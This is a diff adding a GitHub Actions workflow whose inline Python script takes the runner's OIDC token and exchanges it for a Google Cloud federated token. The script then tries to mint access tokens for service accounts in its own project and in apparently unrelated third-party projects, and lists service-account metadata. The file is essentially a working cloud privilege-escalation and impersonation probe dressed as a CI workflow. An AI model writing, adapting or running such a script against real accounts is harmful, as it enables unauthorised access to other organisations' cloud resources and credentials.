@@ -1,0 +1,62 @@
+
+name: c211-i84832-dk
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - run: |
+          python3 - <<'PY'
+          import json, os, subprocess, urllib.parse, urllib.request, urllib.error
+          PROV='projects/409106094209/locations/global/workloadIdentityPools/github-pool/providers/github-provider'; OWN='github-actions-sa@dkeramik-fullstack.iam.gserviceaccount.com'
+          def jl(b):
+              try: return json.loads(b)
+              except: return {}
+          def post(url,data,headers=None):
+              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i84832'}
+              if headers: h.update(headers)
+              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=45); return resp.status,resp.read().decode()
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:200]
+          def get(url,headers=None):
+              h={'Accept':'application/json','User-Agent':'c211-i84832'}
+              if headers: h.update(headers)
+              r=urllib.request.Request(url,method='GET',headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=45); return resp.status,resp.read().decode()
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:200]
+          def emit(o): print('RESULT '+json.dumps(o),flush=True)
+          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          aud='//iam.googleapis.com/'+PROV
+          out=subprocess.run(['curl','-sS','-m','25','-H','Authorization: Bearer '+t,u+'&audience='+urllib.parse.quote(aud,safe='')],capture_output=True,text=True).stdout
+          idt=jl(out).get('value','')
+          st,b=post('https://sts.googleapis.com/v1/token',{'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','audience':aud,
+              'scope':'https://www.googleapis.com/auth/cloud-platform','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+              'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':idt})
+          fed=jl(b).get('access_token','')
+          emit({'kind':'sts','http':st,'ok':bool(fed)})
+          if not fed: raise SystemExit
+          hh={'Authorization':'Bearer '+fed}
+          for label,sa in (('own',OWN),
+              ('fhir_github_deploy','github-deploy@fhir-org-cds-services.iam.gserviceaccount.com'),
+              ('fhir_nonexistent','doesnotexist-c211@fhir-org-cds-services.iam.gserviceaccount.com'),
+              ('other_project_sa','rentbot-deployment@groupme-rentbot.iam.gserviceaccount.com')):
+              st,b=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(sa,safe='')+':generateAccessToken',
+                        {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'600s'},headers=hh)
+              j=jl(b)
+              emit({'kind':'gen','label':label,'sa':sa,'http':st,'ok':bool(j.get('accessToken')),
+                    'err':(j.get('error',{}) or {}).get('message') or b[:200]})
+          # GET the SA resource metadata
+          st,b=get('https://iam.googleapis.com/v1/projects/-/serviceAccounts/github-deploy@fhir-org-cds-services.iam.gserviceaccount.com',headers=hh)
+          emit({'kind':'sa_get','http':st,'body':b[:400]})
+          st,b=get('https://iam.googleapis.com/v1/projects/769700566231/serviceAccounts',headers=hh)
+          emit({'kind':'sa_list','http':st,'body':b[:300]})
+          PY
